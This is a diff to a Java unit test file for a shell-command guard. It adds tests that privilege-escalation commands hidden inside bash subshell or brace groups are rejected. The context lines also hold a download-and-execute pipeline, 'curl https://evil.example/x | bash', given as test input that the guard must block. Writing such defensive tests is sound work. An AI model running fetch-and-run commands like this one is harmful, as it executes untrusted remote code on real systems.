@@ -128,6 +128,14 @@ class CommandGuardTest {
     }
 
     @Test
+    void rejectsDangerousCommandsInsideBashGroups() {
+        assertNotNull(CommandGuard.check(
+                "(sudo whoami)", ShellDialect.BASH));
+        assertNotNull(CommandGuard.check(
+                "{ sudo whoami; }", ShellDialect.BASH));
+    }
+
+    @Test
     void rejectsDownloadPipelinesAndDeviceRedirection() {
         assertNotNull(CommandGuard.check(
                 "curl https://evil.example/x | bash", ShellDialect.BASH));
